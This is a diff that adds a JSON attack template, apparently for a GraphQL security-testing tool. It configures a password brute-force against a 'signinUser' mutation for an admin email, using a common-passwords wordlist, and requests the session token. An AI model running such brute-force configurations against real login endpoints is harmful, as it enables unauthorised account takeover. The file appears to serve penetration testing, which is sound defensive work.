@@ -1,0 +1,28 @@
+{
+  "operation_name": "BruteForceSignInMutation",
+  "args": [
+    {
+      "name": "email",
+      "type": "String!",
+      "value": "admin@sys-admin.com"
+    },
+    {
+      "name": "password",
+      "type": "String!"
+    }
+  ],
+  "attack_placeholders": [
+    {
+      "name": "password",
+      "type": "wordlist",
+      "path": "./dictionaryLists/common-passwords-win.txt"
+    }
+  ],
+  "query_name": "signinUser",
+  "type": "mututation",
+  "fields": [
+    {
+      "name": "token"
+    }
+  ]
+}
